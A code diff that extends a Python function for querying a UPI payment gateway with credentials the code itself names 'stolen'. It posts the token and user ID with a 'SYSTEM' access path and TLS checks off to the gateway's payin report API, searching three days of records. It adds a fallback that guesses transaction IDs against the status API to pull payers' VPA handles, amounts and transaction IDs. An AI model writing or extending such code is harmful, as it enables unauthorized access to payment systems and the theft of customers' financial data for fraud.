@@ -314,8 +314,8 @@ def resolve_payment_url(url):
                 _tok, _usr = stolen
                 domain = cfg["domains"][0] if cfg.get("domains") else cfg["base"]
                 req_id = path_parts[2]
-                from datetime import datetime as _dt
-                _today = _dt.now().strftime("%Y-%m-%d")
+                uuid_part = path_parts[1]
+                from datetime import datetime as _dt, timedelta as _td
                 _auth = {
                     "User-Agent": "Mozilla/5.0",
                     "Content-Type": "application/json",
@@ -323,21 +323,44 @@ def resolve_payment_url(url):
                     "client-id": _usr,
                     "access-path": "SYSTEM",
                 }
-                rpt = requests.post(
-                    f"{domain}/api/v1/upi/q/payin/report",
-                    json={"fromDate": _today, "toDate": _today},
-                    headers=_auth, verify=False, timeout=10
-                )
-                if rpt.status_code == 200:
-                    for line in rpt.text.strip().split('\n')[1:]:
-                        cols = line.split(',')
-                        if len(cols) > 7 and cols[3].strip() == req_id:
-                            result["vpa"] = cols[5].strip()
-                            try: result["amount"] = float(cols[7].strip())
-                            except: pass
-                            result["txn_id"] = cols[4].strip()
-                            result["request_id"] = cols[3].strip()
-                            break
+                # Search last 3 days
+                _today = _dt.now()
+                for day_offset in range(3):
+                    _d = (_today - _td(days=day_offset)).strftime("%Y-%m-%d")
+                    rpt = requests.post(
+                        f"{domain}/api/v1/upi/q/payin/report",
+                        json={"fromDate": _d, "toDate": _d},
+                        headers=_auth, verify=False, timeout=10
+                    )
+                    if rpt.status_code == 200:
+                        for line in rpt.text.strip().split('\n')[1:]:
+                            cols = line.split(',')
+                            if len(cols) > 7 and cols[3].strip() == req_id:
+                                result["vpa"] = cols[5].strip()
+                                try: result["amount"] = float(cols[7].strip())
+                                except: pass
+                                result["txn_id"] = cols[4].strip()
+                                result["request_id"] = cols[3].strip()
+                                break
+                    if result["vpa"]:
+                        break
+                
+                # Fallback: try status API with UUID as txn prefix
+                if not result["vpa"]:
+                    try:
+                        txn_guess = f"LI-{uuid_part}" if gw_key == "oneten" else f"MI-{uuid_part}"
+                        sr = requests.get(
+                            f"{domain}/api/v1/upi/q/payin/status/{txn_guess}",
+                            headers=_auth, verify=False, timeout=5
+                        )
+                        if sr.status_code == 200:
+                            sd = sr.json()
+                            if sd.get("requestedAmount"):
+                                result["amount"] = float(sd["requestedAmount"])
+                                result["vpa"] = sd.get("additional", {}).get("VPA", "")
+                                result["txn_id"] = sd.get("txnId", txn_guess)
+                                result["request_id"] = sd.get("header", {}).get("requestId", req_id)
+                    except: pass
         except: pass
         
         if result["vpa"] and result["amount"]:
